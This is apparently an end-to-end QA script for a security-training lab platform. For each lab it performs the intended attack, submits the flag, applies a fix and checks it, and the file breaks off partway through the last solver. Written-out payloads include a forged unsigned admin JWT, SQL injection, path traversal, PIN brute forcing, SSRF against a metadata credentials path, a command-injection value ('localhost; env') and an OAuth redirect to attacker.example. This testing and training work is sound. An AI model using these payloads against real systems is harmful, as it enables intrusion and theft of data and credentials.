#!/usr/bin/env node
/**
 * End-to-end lab verification.
 *
 * For each lab this script signs in as a learner, provisions a real session,
 * performs the intended attack *through the authenticated gateway / terminal*,
 * submits the real flag returned by the lab, applies the remediation and runs
 * the live validator. Nothing here reads template secrets or hardcodes flags.
 *
 * Usage: node scripts/qa/lab-e2e.mjs [labId ...]
 */
import WebSocket from 'ws';

const BASE = process.env.CF_API_BASE ?? 'http://127.0.0.1:5000';
const EMAIL = process.env.CF_LEARNER_EMAIL ?? 'learner@cipherforge.dev';
const PASSWORD = process.env.CF_LEARNER_PASSWORD ?? 'CipherForge!2024';

const results = [];
function record(labId, name, ok, detail = '') {
  results.push({ labId, name, ok, detail });
  console.log(`${ok ? 'PASS' : 'FAIL'} [${labId}] ${name}${detail ? ` :: ${String(detail).slice(0, 300)}` : ''}`);
}

class Client {
  constructor() {
    this.cookies = new Map();
    this.csrf = '';
  }
  cookieHeader(extra = '') {
    const base = [...this.cookies].map(([k, v]) => `${k}=${v}`).join('; ');
    return [base, extra].filter(Boolean).join('; ');
  }
  absorb(res) {
    for (const c of res.headers.getSetCookie?.() ?? []) {
      const [pair] = c.split(';');
      const idx = pair.indexOf('=');
      const k = pair.slice(0, idx);
      const v = pair.slice(idx + 1);
      if (!v) this.cookies.delete(k);
      else this.cookies.set(k, v);
    }
    const token = res.headers.get('x-csrf-token');
    if (token) this.csrf = token;
  }
  async api(method, path, body) {
    const res = await fetch(BASE + path, {
      method,
      headers: {
        cookie: this.cookieHeader(),
        ...(body !== undefined ? { 'content-type': 'application/json' } : {}),
        ...(this.csrf ? { 'x-csrf-token': this.csrf } : {}),
      },
      body: body === undefined ? undefined : JSON.stringify(body),
    });
    this.absorb(res);
    const text = await res.text();
    let json = null;
    try {
      json = text ? JSON.parse(text) : null;
    } catch {}
    return { status: res.status, json, text, headers: res.headers };
  }
  async login() {
    if (process.env.CF_QA_REUSE_USER === '1') {
      const res = await this.api('POST', '/api/auth/login', { email: EMAIL, password: PASSWORD });
      if (res.status !== 200) throw new Error(`login failed: ${res.status} ${res.text.slice(0, 200)}`);
      return;
    }
    // Fresh learner per run: keeps provisioning quotas isolated between QA runs.
    const suffix = `${Date.now().toString(36)}${Math.floor(Math.random() * 1000)}`;
    const email = `qa-${suffix}@example.test`;
    const password = 'QaRunner!2024';
    const res = await this.api('POST', '/api/auth/register', {
      email,
      username: `qa-${suffix}`.slice(0, 24),
      password,
    });
    if (res.status === 429) {
      // Registration is rate limited per IP; fall back to the seeded learner so the
      // matrix can still run (scores accumulate on that account, which is fine for QA).
      const fallback = await this.api('POST', '/api/auth/login', { email: EMAIL, password: PASSWORD });
      if (fallback.status !== 200) throw new Error(`registration rate limited and fallback login failed: ${fallback.status}`);
      return;
    }
    if (res.status !== 201 && res.status !== 200) throw new Error(`registration failed: ${res.status} ${res.text.slice(0, 200)}`);
  }
}

async function waitReady(client, sessionId) {
  let state = 'queued';
  for (let i = 0; i < 160; i += 1) {
    const res = await client.api('GET', `/api/sessions/${sessionId}`);
    state = res.json?.session?.state ?? 'unknown';
    if (['ready', 'failed', 'expired', 'stopped'].includes(state)) return res.json.session;
    await new Promise((r) => setTimeout(r, 500));
  }
  return { state };
}

async function startLab(client, labId) {
  const detail = await client.api('GET', `/api/labs/${labId}`);
  const existing = (await client.api('GET', '/api/sessions')).json?.sessions?.find(
    (s) => s.labId === labId && ['queued', 'provisioning', 'starting', 'ready'].includes(s.state),
  );
  if (existing) {
    const session = existing.state === 'ready' ? existing : await waitReady(client, existing.id);
    return { session, reused: true, detail: detail.json?.lab };
  }
  const started = await client.api('POST', `/api/labs/${labId}/sessions`);
  if (![200, 201].includes(started.status)) throw new Error(`could not start ${labId}: ${started.status} ${started.text.slice(0, 200)}`);
  const session = started.json.session.state === 'ready' ? started.json.session : await waitReady(client, started.json.session.id);
  return { session, reused: false, detail: detail.json?.lab };
}

async function gateway(client, sessionId, target, path, options = {}) {
  const labCookie = options.labCookie ?? '';
  const res = await fetch(`${BASE}/api/sessions/${sessionId}/target/${target}${path}`, {
    ...options,
    headers: {
      cookie: [client.cookieHeader(), labCookie].filter(Boolean).join('; '),
      'content-type': options.form ? 'application/x-www-form-urlencoded' : undefined,
      ...(options.headers ?? {}),
    },
    redirect: options.redirect ?? 'manual',
  });
  const text = await res.text();
  // Persist any cookies the lab target set (they are scoped to the gateway path).
  const setCookies = res.headers.getSetCookie?.() ?? [];
  const cookieNames = setCookies.map((c) => c.split('=')[0]);
  return { status: res.status, headers: res.headers, text, setCookies, cookieNames };
}

async function terminalExec(sessionId, cookie, command, _legacyMarker, timeoutMs = 30000) {
  // Sentinels are produced by the shell itself, so the PTY's echo of this
  // command never contains them and the output can be sliced reliably.
  const full = [
    `printf '\\nCF_BEGIN_%s\\n' "$RANDOM$RANDOM"`,
    command,
    `printf '\\nCF_END_%s\\n' "$RANDOM$RANDOM"`,
    '',
  ].join('\n');
  return new Promise((resolve, reject) => {
    const ws = new WebSocket(`ws://127.0.0.1:5000/ws/terminal/${sessionId}`, { headers: { cookie, origin: BASE } });
    let output = '';
    let settled = false;
    const finish = (err) => {
      if (settled) return;
      settled = true;
      try { ws.close(); } catch {}
      if (err) return reject(err);
      const beginMatch = /CF_BEGIN_\d+/.exec(output);
      const afterBegin = beginMatch ? output.slice(beginMatch.index + beginMatch[0].length) : output;
      const endMatch = /CF_END_\d+/.exec(afterBegin);
      const body = endMatch ? afterBegin.slice(0, endMatch.index) : afterBegin;
      resolve(
        body
          .replace(/\x1b\[[0-9;?]*[A-Za-z]/g, '')
          .split(/\r?\n/)
          .map((line) => line.replace(/\r/g, '').trimEnd())
          .filter((line) => line.trim().length > 0)
          // Prompts and bracketed-paste toggles are terminal chrome, not output.
          .filter((line) => !/^~ \$/.test(line.trim()) && !line.includes('?2004h') && !line.includes('?2004l'))
          .join('\n'),
      );
    };
    ws.on('open', () => {
      setTimeout(() => {
        ws.send(JSON.stringify({ type: 'input', data: Buffer.from(full).toString('base64') }));
      }, 700);
    });
    ws.on('message', (raw) => {
      try {
        const msg = JSON.parse(raw.toString());
        if (msg.type === 'output') output += Buffer.from(msg.data, 'base64').toString();
      } catch {}
      if (/CF_END_\d+/.test(output)) finish();
    });
    ws.on('error', (err) => finish(err));
    setTimeout(() => finish(new Error(`terminal command timed out: ${command}`)), timeoutMs);
  });
}

async function muteEcho(sessionId, cookie) {
  // The first command is echoed back; after `stty -echo` the terminal stops
  // echoing keystrokes, so later commands produce clean, parseable output.
  try {
    await terminalExec(sessionId, cookie, 'stty -echo 2>/dev/null || true', '', 15000);
  } catch {}
}

async function writeFileInSession(sessionId, cookie, path, contents) {
  const b64 = Buffer.from(contents).toString('base64');
  await terminalExec(sessionId, cookie, `mkdir -p "$(dirname ${path})" && printf %s ${b64} | base64 -d > ${path}`, '');
  const check = await terminalExec(sessionId, cookie, `wc -c < ${path}`, '');
  return Number(String(check).match(/\b(\d{1,6})\b\s*$/m)?.[1] ?? 0);
}

async function submitFlag(client, sessionId, objectiveId, flag) {
  const res = await client.api('POST', `/api/sessions/${sessionId}/objectives/${objectiveId}/submit`, { flag });
  return res;
}

function checkDetail(checked) {
  const issues = checked.json?.evidence?.issues;
  if (Array.isArray(issues) && issues.length) return issues.join(' | ');
  return checked.json?.message ?? `status=${checked.status}`;
}

async function runCheck(client, sessionId, objectiveId) {
  return client.api('POST', `/api/sessions/${sessionId}/objectives/${objectiveId}/check`, {});
}

const solvers = {
  async 'http-header-hunt'(client, session, { gateway, terminalExec }) {
    const login = await gateway(client, session.id, 'web', '/login', {
      method: 'POST',
      form: true,
      body: 'email=ops%40nimbusfreight.example&password=freight2024',
    });
    record('http-header-hunt', 'portal login via gateway', login.status === 302, `status=${login.status}`);
    const cookie = login.setCookies.map((c) => c.split(';')[0]).join('; ');
    const dash = await gateway(client, session.id, 'web', '/dashboard', { labCookie: cookie });
    const flag = dash.headers.get('x-build-token');
    record('http-header-hunt', 'leaked build token captured', /^CF\{/.test(flag ?? ''), `${String(flag).slice(0, 6)}…`);
    const submitted = await submitFlag(client, session.id, 'build-token', flag);
    record('http-header-hunt', 'flag objective accepted', submitted.status === 200 && submitted.json.passed === true, `status=${submitted.status}`);
    const applied = await terminalExec(session.id, client.cookieHeader(), "echo eyJoZWFkZXJzIjp7IkNvbnRlbnQtU2VjdXJpdHktUG9saWN5IjoiZGVmYXVsdC1zcmMgJ3NlbGYnOyBmcmFtZS1hbmNlc3RvcnMgJ25vbmUnIiwiU3RyaWN0LVRyYW5zcG9ydC1TZWN1cml0eSI6Im1heC1hZ2U9MzE1MzYwMDA7IGluY2x1ZGVTdWJEb21haW5zIiwiWC1Db250ZW50LVR5cGUtT3B0aW9ucyI6Im5vc25pZmYiLCJSZWZlcnJlci1Qb2xpY3kiOiJzdHJpY3Qtb3JpZ2luLXdoZW4tY3Jvc3Mtb3JpZ2luIiwiUGVybWlzc2lvbnMtUG9saWN5IjoiY2FtZXJhPSgpLCBtaWNyb3Bob25lPSgpIiwiWC1GcmFtZS1PcHRpb25zIjoiREVOWSJ9fQ== | base64 -d | labctl policy apply -", '');
    record('http-header-hunt', 'policy applied through labctl', applied.includes('"applied": true'), applied.slice(-160).replace(/\s+/g, ' '));
    const checked = await runCheck(client, session.id, 'harden-headers');
    record('http-header-hunt', 'live header validator passes after fix', checked.status === 200 && checked.json.passed === true, checkDetail(checked));
    const evidence = {
      missingBefore: ['content-security-policy', 'strict-transport-security', 'x-content-type-options', 'referrer-policy', 'permissions-policy', 'x-frame-options'],
      applied: {
        'content-security-policy': "default-src 'self'; frame-ancestors 'none'",
        'strict-transport-security': 'max-age=31536000; includeSubDomains',
        'x-content-type-options': 'nosniff',
        'referrer-policy': 'strict-origin-when-cross-origin',
        'permissions-policy': 'camera=(), microphone=()',
        'x-frame-options': 'DENY',
      },
      notes: 'Baseline responses had no browser security headers; the hardened policy was verified against live responses.',
    };
    await writeFileInSession(session.id, client.cookieHeader(), '~/evidence/headers-findings.json', JSON.stringify(evidence, null, 2));
    const evidenceCheck = await runCheck(client, session.id, 'evidence-report');
    record('http-header-hunt', 'evidence report accepted', evidenceCheck.status === 200 && evidenceCheck.json.passed === true, evidenceCheck.json?.message ?? `status=${evidenceCheck.status}`);
    return { flagObjective: 'build-token', checkObjective: 'harden-headers' };
  },

  async 'idor-invoice-hunt'(client, session) {
    const login = await gateway(client, session.id, 'web', '/login', {
      method: 'POST',
      form: true,
      body: 'email=analyst%40lumenhealth.example&password=lumen2024',
    });
    record('idor-invoice-hunt', 'patient login via gateway', login.status === 302, `status=${login.status}`);
    const cookie = login.setCookies.map((c) => c.split(';')[0]).join('; ');
    const before = await gateway(client, session.id, 'web', '/api/invoices/INV-1099', { labCookie: cookie });
    const flag = before.text.match(/CF\{[^}]+\}/)?.[0];
    record('idor-invoice-hunt', 'foreign invoice readable before fix', before.status === 200 && /^CF\{/.test(flag ?? ''), `status=${before.status}`);
    const submitted = await submitFlag(client, session.id, 'invoice-flag', flag);
    record('idor-invoice-hunt', 'flag objective accepted', submitted.status === 200 && submitted.json.passed === true, submitted.json?.message ?? `status=${submitted.status}`);
    const applied = await terminalExec(session.id, client.cookieHeader(), "echo '{\"enforceOwnership\":true}' | labctl policy apply -", '');
    record('idor-invoice-hunt', 'ownership policy applied', applied.includes('"applied": true'), applied.slice(-140).replace(/\s+/g, ' '));
    const blocked = await gateway(client, session.id, 'web', '/api/invoices/INV-1099', { labCookie: cookie });
    record('idor-invoice-hunt', 'foreign invoice now denied', blocked.status === 403, `status=${blocked.status}`);
    const checked = await runCheck(client, session.id, 'fix-ownership');
    record('idor-invoice-hunt', 'live authorization validator passes', checked.status === 200 && checked.json.passed === true, checkDetail(checked));
    return { flagObjective: 'invoice-flag', checkObjective: 'fix-ownership' };
  },

  async 'path-traversal-vault'(client, session) {
    const attack = await gateway(client, session.id, 'web', `/docs?file=${encodeURIComponent('../internal/flag.txt')}`);
    const flag = attack.text.match(/CF\{[^}]+\}/)?.[0];
    record('path-traversal-vault', 'internal document read via traversal', attack.status === 200 && /^CF\{/.test(flag ?? ''), `status=${attack.status}`);
    const submitted = await submitFlag(client, session.id, 'vault-flag', flag);
    record('path-traversal-vault', 'flag objective accepted', submitted.status === 200 && submitted.json.passed === true, submitted.json?.message ?? `status=${submitted.status}`);
    const applied = await terminalExec(session.id, client.cookieHeader(), "echo '{\"blockTraversal\":true}' | labctl policy apply -", '');
    record('path-traversal-vault', 'containment policy applied', applied.includes('"applied": true'), applied.slice(-140).replace(/\s+/g, ' '));
    const blocked = await gateway(client, session.id, 'web', `/docs?file=${encodeURIComponent('../internal/flag.txt')}`);
    record('path-traversal-vault', 'traversal request now rejected', blocked.status === 400, `status=${blocked.status}`);
    const checked = await runCheck(client, session.id, 'block-traversal');
    record('path-traversal-vault', 'live traversal validator passes', checked.status === 200 && checked.json.passed === true, checkDetail(checked));
    return { flagObjective: 'vault-flag', checkObjective: 'block-traversal' };
  },

  async 'jwt-none-forge'(client, session, { gateway, terminalExec }) {
    const login = await gateway(client, session.id, 'web', '/api/login', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ email: 'analyst@aurorapay.example', password: 'aurora2024' }),
    });
    let token = '';
    try { token = JSON.parse(login.text).token ?? ''; } catch {}
    record('jwt-none-forge', 'partner login returns a signed token', login.status === 200 && token.split('.').length === 3, `status=${login.status}`);
    const b64 = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64url');
    const forged = `${b64({ alg: 'none', typ: 'JWT' })}.${b64({ sub: 'qa', role: 'admin', exp: 9999999999 })}.`;
    const exported = await gateway(client, session.id, 'web', '/api/admin/export', {
      headers: { authorization: `Bearer ${forged}` },
    });
    const flag = exported.text.match(/CF\{[^}]+\}/)?.[0];
    record('jwt-none-forge', 'unsigned admin token accepted', exported.status === 200 && /^CF\{/.test(flag ?? ''), `status=${exported.status}`);
    const submitted = await submitFlag(client, session.id, 'admin-export', flag);
    record('jwt-none-forge', 'flag objective accepted', submitted.status === 200 && submitted.json.passed === true, submitted.json?.message ?? `status=${submitted.status}`);
    const applied = await terminalExec(session.id, client.cookieHeader(), `printf '%s' '{"rejectAlgNone":true}' | labctl policy apply -`, '');
    record('jwt-none-forge', 'verifier policy applied', applied.includes('"applied": true'), applied.slice(-120).replace(/\s+/g, ' '));
    const stillForged = await gateway(client, session.id, 'web', '/api/admin/export', {
      headers: { authorization: `Bearer ${forged}` },
    });
    record('jwt-none-forge', 'unsigned token now rejected', stillForged.status === 401, `status=${stillForged.status}`);
    const checked = await runCheck(client, session.id, 'reject-none');
    record('jwt-none-forge', 'live verifier validator passes', checked.status === 200 && checked.json.passed === true, checkDetail(checked));
    return { flagObjective: 'admin-export', checkObjective: 'reject-none' };
  },

  async 'cloud-bucket-exposure'(client, session, { gateway, terminalExec }) {
    const listing = await gateway(client, session.id, 'web', '/storage/vela-backups');
    let objects = [];
    try { objects = JSON.parse(listing.text).objects ?? []; } catch {}
    record('cloud-bucket-exposure', 'backup bucket lists anonymously', listing.status === 200 && objects.length > 0, `status=${listing.status} objects=${objects.length}`);
    const snapshot = await gateway(client, session.id, 'web', '/storage/vela-backups/db-snapshot-2026-10-24.txt');
    const flag = snapshot.text.match(/CF\{[^}]+\}/)?.[0];
    record('cloud-bucket-exposure', 'snapshot leaks internal marker', snapshot.status === 200 && /^CF\{/.test(flag ?? ''), `status=${snapshot.status}`);
    const submitted = await submitFlag(client, session.id, 'backup-flag', flag);
    record('cloud-bucket-exposure', 'flag objective accepted', submitted.status === 200 && submitted.json.passed === true, submitted.json?.message ?? `status=${submitted.status}`);
    const applied = await terminalExec(session.id, client.cookieHeader(), `printf '%s' '{"requireAuthForBackups":true}' | labctl policy apply -`, '');
    record('cloud-bucket-exposure', 'bucket ACL policy applied', applied.includes('"applied": true'), applied.slice(-120).replace(/\s+/g, ' '));
    const denied = await gateway(client, session.id, 'web', '/storage/vela-backups');
    record('cloud-bucket-exposure', 'anonymous backup listing now denied', denied.status === 403, `status=${denied.status}`);
    const checked = await runCheck(client, session.id, 'lock-backups');
    record('cloud-bucket-exposure', 'live ACL validator passes', checked.status === 200 && checked.json.passed === true, checkDetail(checked));
    return { flagObjective: 'backup-flag', checkObjective: 'lock-backups' };
  },

  async 'log-forensics'(client, session, { terminalExec }) {
    const found = await terminalExec(session.id, client.cookieHeader(), `grep -oE 'CF\\{[^}]+\\}' ~/artifacts/access.log | head -1`, '');
    const flag = found.match(/CF\{[^}]+\}/)?.[0];
    record('log-forensics', 'exfiltration marker recovered from logs', /^CF\{/.test(flag ?? ''), flag ?? 'not found');
    const submitted = await submitFlag(client, session.id, 'exfil-marker', flag);
    record('log-forensics', 'flag objective accepted', submitted.status === 200 && submitted.json.passed === true, submitted.json?.message ?? `status=${submitted.status}`);
    const scan = await terminalExec(
      session.id,
      client.cookieHeader(),
      `python3 -c "import json;rows=[json.loads(l) for l in open('/home/learner/artifacts/access.log')];a=[r for r in rows if 'sqlmap' in r['user_agent'].lower()];m=[r['path'] for r in rows if 'CF{' in r['path']][0].split('token=')[1];print('IP='+a[0]['ip']+' EP=/api/admin/export MARKER='+m)"`,
      '',
    );
    const ip = scan.match(/IP=([0-9.]+)/)?.[1];
    const marker = scan.match(/MARKER=(CF\{[^}]+\})/)?.[1];
    const evidence = {
      attackerIp: ip,
      endpoint: '/api/admin/export',
      marker,
      notes: 'Repeated 401s from the same address were followed by a sqlmap user agent and a valid-account export; the marker left in the request path confirms data exfiltration.',
    };
    await writeFileInSession(session.id, client.cookieHeader(), '~/evidence/incident.json', JSON.stringify(evidence, null, 2));
    const checked = await runCheck(client, session.id, 'incident-report');
    record('log-forensics', 'incident report validator passes', checked.status === 200 && checked.json.passed === true, checkDetail(checked));
    return { flagObjective: 'exfil-marker', checkObjective: 'incident-report' };
  },

  async 'linux-permissions'(client, session, { terminalExec }) {
    const fixed = await terminalExec(
      session.id,
      client.cookieHeader(),
      `chmod 700 ~/.ssh; chmod 600 ~/.ssh/id_ed25519 ~/.config/portal/credentials; chmod o-w ~/work/report.txt; stat -c '%a %n' ~/.ssh ~/.ssh/id_ed25519 ~/.config/portal/credentials ~/work/report.txt`,
      '',
    );
    record('linux-permissions', 'sensitive modes tightened', /700 .*\.ssh/.test(fixed) && /600 .*id_ed25519/.test(fixed), fixed.split('\n').filter((l) => /\d{3} /.test(l)).slice(-4).join(' | '));
    const first = await runCheck(client, session.id, 'ssh-perms');
    record('linux-permissions', 'ssh hardening validator passes', first.status === 200 && first.json.passed === true, checkDetail(first));
    const evidence = {
      issues: [
        { path: '~/.ssh', before: '0777', after: '0700' },
        { path: '~/.ssh/id_ed25519', before: '0644', after: '0600' },
        { path: '~/.config/portal/credentials', before: '0644', after: '0600' },
      ],
      notes: 'Provisioning drift left key material readable by any local process and allowed tampering with reports; owner-only modes restore least privilege.',
    };
    await writeFileInSession(session.id, client.cookieHeader(), '~/evidence/permissions.json', JSON.stringify(evidence, null, 2));
    const second = await runCheck(client, session.id, 'writable-audit');
    record('linux-permissions', 'writable audit validator passes', second.status === 200 && second.json.passed === true, checkDetail(second));
    return { flagObjective: null, checkObjective: 'writable-audit' };
  },

  async 'pcap-dns-exfil'(client, session, { terminalExec }) {
    const decoded = await terminalExec(
      session.id,
      client.cookieHeader(),
      `python3 ~/tools/dnsq.py ~/artifacts/capture.pcap | grep 'exfil.vela-retail.example' | sed 's/\\.exfil.*//' | tr -d '.' | tr -d '\\n' | python3 -c "import sys;print(bytes.fromhex(sys.stdin.read().strip()).decode())"`,
      '',
    );
    const flag = decoded.match(/CF\{[^}]+\}/)?.[0];
    record('pcap-dns-exfil', 'hex labels reassembled into a token', /^CF\{/.test(flag ?? ''), flag ?? decoded.slice(-80));
    const submitted = await submitFlag(client, session.id, 'exfil-token', flag);
    record('pcap-dns-exfil', 'flag objective accepted', submitted.status === 200 && submitted.json.passed === true, submitted.json?.message ?? `status=${submitted.status}`);
    const labels = await terminalExec(
      session.id,
      client.cookieHeader(),
      `python3 ~/tools/dnsq.py ~/artifacts/capture.pcap | grep 'exfil.vela-retail.example' | sed 's/\\.exfil.*//' | tr '.' '\\n' | sort -u`,
      '',
    );
    const encodedLabels = labels.match(/[0-9a-f]{16,}/g) ?? [];
    const evidence = {
      exfilDomain: 'exfil.vela-retail.example',
      encodedLabels,
      decodedFlag: flag,
      notes: 'The workstation split hex-encoded data across DNS labels under an unfamiliar subdomain; DNS egress is allowed so the tunnel left the network unimpeded.',
    };
    await writeFileInSession(session.id, client.cookieHeader(), '~/evidence/dns-exfil.json', JSON.stringify(evidence, null, 2));
    const checked = await runCheck(client, session.id, 'dns-exfil-report');
    record('pcap-dns-exfil', 'dns exfiltration report validator passes', checked.status === 200 && checked.json.passed === true, checkDetail(checked));
    return { flagObjective: 'exfil-token', checkObjective: 'dns-exfil-report' };
  },

  async 'phishing-email-triage'(client, session, { terminalExec }) {
    const decoded = await terminalExec(
      session.id,
      client.cookieHeader(),
      `grep -A3 'Content-Transfer-Encoding: base64' ~/artifacts/email/2026-10-23-overdue-invoice.eml | tail -n +2 | base64 -d 2>/dev/null | grep -oE 'CF\\{[^}]+\\}' | head -1`,
      '',
    );
    const flag = decoded.match(/CF\{[^}]+\}/)?.[0];
    record('phishing-email-triage', 'attachment decoded to a marker', /^CF\{/.test(flag ?? ''), flag ?? decoded.slice(-80));
    const submitted = await submitFlag(client, session.id, 'malicious-attachment', flag);
    record('phishing-email-triage', 'flag objective accepted', submitted.status === 200 && submitted.json.passed === true, submitted.json?.message ?? `status=${submitted.status}`);
    const url = await terminalExec(
      session.id,
      client.cookieHeader(),
      `grep -A3 'Content-Transfer-Encoding: base64' ~/artifacts/email/2026-10-23-overdue-invoice.eml | tail -n +2 | base64 -d 2>/dev/null | grep -oE 'https://[^" ]+' | head -1`,
      '',
    );
    const portalUrl = url.match(/https:\/\/[^\s"']+/)?.[0];
    if (process.env.CF_QA_DEBUG) console.log('[debug] portal raw=', JSON.stringify(url));
    const evidence = {
      maliciousFile: '2026-10-23-overdue-invoice.eml',
      senderDomain: 'vela-billing-secure.example',
      decodedFlag: flag,
      portalUrl,
      notes: 'SPF none, DKIM none and DMARC fail, plus a lookalike billing domain and a payment-themed attachment; the decoded payload confirms it is a lure.',
    };
    await writeFileInSession(session.id, client.cookieHeader(), '~/evidence/phishing.json', JSON.stringify(evidence, null, 2));
    const checked = await runCheck(client, session.id, 'phishing-report');
    record('phishing-email-triage', 'phishing report validator passes', checked.status === 200 && checked.json.passed === true, checkDetail(checked));
    return { flagObjective: 'malicious-attachment', checkObjective: 'phishing-report' };
  },

  async 'sqli-orders-portal'(client, session, { gateway, terminalExec }) {
    const baseline = await gateway(client, session.id, 'web', '/api/orders?status=shipped');
    let rows = [];
    try { rows = JSON.parse(baseline.text).rows ?? []; } catch {}
    record('sqli-orders-portal', 'legitimate filter returns shipped orders', baseline.status === 200 && rows.length > 0 && rows.every((r) => r.status === 'shipped'), `status=${baseline.status} rows=${rows.length}`);
    const injected = await gateway(client, session.id, 'web', `/api/orders?status=${encodeURIComponent("' OR '1'='1")}`);
    const flag = injected.text.match(/CF\{[^}]+\}/)?.[0];
    record('sqli-orders-portal', 'tautology returns the restricted order', injected.status === 200 && /^CF\{/.test(flag ?? ''), `status=${injected.status}`);
    const submitted = await submitFlag(client, session.id, 'orders-flag', flag);
    record('sqli-orders-portal', 'flag objective accepted', submitted.status === 200 && submitted.json.passed === true, submitted.json?.message ?? `status=${submitted.status}`);
    const applied = await terminalExec(session.id, client.cookieHeader(), `printf '%s' '{"parameterizedQueries":true}' | labctl policy apply -`, '');
    record('sqli-orders-portal', 'query-safety policy applied', applied.includes('"applied": true'), applied.slice(-110).replace(/\s+/g, ' '));
    const replayed = await gateway(client, session.id, 'web', `/api/orders?status=${encodeURIComponent("' OR '1'='1")}`);
    record('sqli-orders-portal', 'tautology no longer returns restricted rows', !/CF\{/.test(replayed.text), `status=${replayed.status}`);
    const checked = await runCheck(client, session.id, 'fix-orders');
    record('sqli-orders-portal', 'live injection validator passes', checked.status === 200 && checked.json.passed === true, checkDetail(checked));
    return { flagObjective: 'orders-flag', checkObjective: 'fix-orders' };
  },

  async 'brute-force-gate'(client, session, { gateway, terminalExec }) {
    const probe = await gateway(client, session.id, 'web', '/api/admin/login', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ pin: '0000' }),
    });
    record('brute-force-gate', 'wrong PIN rejected without lockout', probe.status === 401, `status=${probe.status}`);
    const search = await terminalExec(
      session.id,
      client.cookieHeader(),
      `python3 -c "import json,urllib.request
for pin in range(10000):
    req=urllib.request.Request('http://127.0.0.1:8080/api/admin/login',data=json.dumps({'pin':'%04d'%pin}).encode(),headers={'content-type':'application/json'})
    try:
        body=json.load(urllib.request.urlopen(req)); print('PIN=%04d TOKEN=%s'%(pin,body['token'])); break
    except Exception: pass"`,
      '',
      120000,
    );
    const token = search.match(/TOKEN=([A-Za-z0-9_-]+)/)?.[1];
    record('brute-force-gate', 'PIN enumerated from the terminal', Boolean(token), search.split('\n')[0] ?? 'no match');
    const dashboard = await gateway(client, session.id, 'web', '/api/admin/dashboard', { headers: { 'x-admin-session': token ?? '' } });
    const flag = dashboard.text.match(/CF\{[^}]+\}/)?.[0];
    record('brute-force-gate', 'admin dashboard readable with the recovered session', dashboard.status === 200 && /^CF\{/.test(flag ?? ''), `status=${dashboard.status}`);
    const submitted = await submitFlag(client, session.id, 'gate-flag', flag);
    record('brute-force-gate', 'flag objective accepted', submitted.status === 200 && submitted.json.passed === true, submitted.json?.message ?? `status=${submitted.status}`);
    const applied = await terminalExec(session.id, client.cookieHeader(), `printf '%s' '{"lockoutAfter":5}' | labctl policy apply -`, '');
    record('brute-force-gate', 'lockout policy applied', applied.includes('"applied": true'), applied.slice(-110).replace(/\s+/g, ' '));
    const blocked = await gateway(client, session.id, 'web', '/api/admin/login', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ pin: '0001' }),
    });
    record('brute-force-gate', 'guessing is throttled', [401, 429].includes(blocked.status), `status=${blocked.status}`);
    const checked = await runCheck(client, session.id, 'lockout');
    record('brute-force-gate', 'live lockout validator passes', checked.status === 200 && checked.json.passed === true, checkDetail(checked));
    return { flagObjective: 'gate-flag', checkObjective: 'lockout' };
  },

  async 'ssrf-metadata-hunt'(client, session, { gateway, terminalExec }) {
    const meta = await gateway(client, session.id, 'web', '/api/import', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ url: 'http://127.0.0.1:9090/latest/meta-data/iam/security-credentials/freight-importer' }),
    });
    const flag = meta.text.match(/CF\{[^}]+\}/)?.[0];
    record('ssrf-metadata-hunt', 'importer reaches the loopback metadata service', meta.status === 200 && /^CF\{/.test(flag ?? ''), `status=${meta.status}`);
    const submitted = await submitFlag(client, session.id, 'metadata-flag', flag);
    record('ssrf-metadata-hunt', 'flag objective accepted', submitted.status === 200 && submitted.json.passed === true, submitted.json?.message ?? `status=${submitted.status}`);
    const applied = await terminalExec(session.id, client.cookieHeader(), `printf '%s' '{"allowlistUrls":true}' | labctl policy apply -`, '');
    record('ssrf-metadata-hunt', 'egress allow-list applied', applied.includes('"applied": true'), applied.slice(-110).replace(/\s+/g, ' '));
    const replayed = await gateway(client, session.id, 'web', '/api/import', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ url: 'http://127.0.0.1:9090/latest/meta-data/iam/security-credentials/freight-importer' }),
    });
    record('ssrf-metadata-hunt', 'metadata pivot now blocked', replayed.status === 403 && !/CF\{/.test(replayed.text), `status=${replayed.status}`);
    const checked = await runCheck(client, session.id, 'allowlist');
    record('ssrf-metadata-hunt', 'live egress validator passes', checked.status === 200 && checked.json.passed === true, checkDetail(checked));
    return { flagObjective: 'metadata-flag', checkObjective: 'allowlist' };
  },

  async 'cmdi-netcheck'(client, session, { gateway, terminalExec }) {
    const injected = await gateway(client, session.id, 'web', `/api/netcheck?host=${encodeURIComponent('localhost; env')}`);
    const flag = injected.text.match(/CF\{[^}]+\}/)?.[0];
    record('cmdi-netcheck', 'metacharacters execute a second command', injected.status === 200 && /^CF\{/.test(flag ?? ''), `status=${injected.status}`);
    const submitted = await submitFlag(client, session.id, 'shell-flag', flag);
    record('cmdi-netcheck', 'flag objective accepted', submitted.status === 200 && submitted.json.passed === true, submitted.json?.message ?? `status=${submitted.status}`);
    const applied = await terminalExec(session.id, client.cookieHeader(), `printf '%s' '{"shellDisabled":true}' | labctl policy apply -`, '');
    record('cmdi-netcheck', 'shell-free execution applied', applied.includes('"applied": true'), applied.slice(-110).replace(/\s+/g, ' '));
    const replayed = await gateway(client, session.id, 'web', `/api/netcheck?host=${encodeURIComponent('localhost; env')}`);
    record('cmdi-netcheck', 'metacharacters no longer execute', !/CF\{/.test(replayed.text), `status=${replayed.status}`);
    const checked = await runCheck(client, session.id, 'no-shell');
    record('cmdi-netcheck', 'live injection validator passes', checked.status === 200 && checked.json.passed === true, checkDetail(checked));
    return { flagObjective: 'shell-flag', checkObjective: 'no-shell' };
  },

  async 'open-redirect-oauth'(client, session, { gateway, terminalExec }) {
    const leaked = await gateway(client, session.id, 'web', `/oauth/authorize?client_id=kestrel-web&redirect_uri=${encodeURIComponent('https://attacker.example/collect')}`);
    const location = leaked.headers.get('location') ?? '';
    const flag = decodeURIComponent(location).match(/CF\{[^}]+\}/)?.[0];
    record('open-redirect-oauth', 'code delivered to an unregistered host', leaked.status === 302 && /^CF\{/.test(flag ?? ''), `status=${leaked.status}`);
    const submitted = await submitFlag(client, session.id, 'oauth-flag', flag);
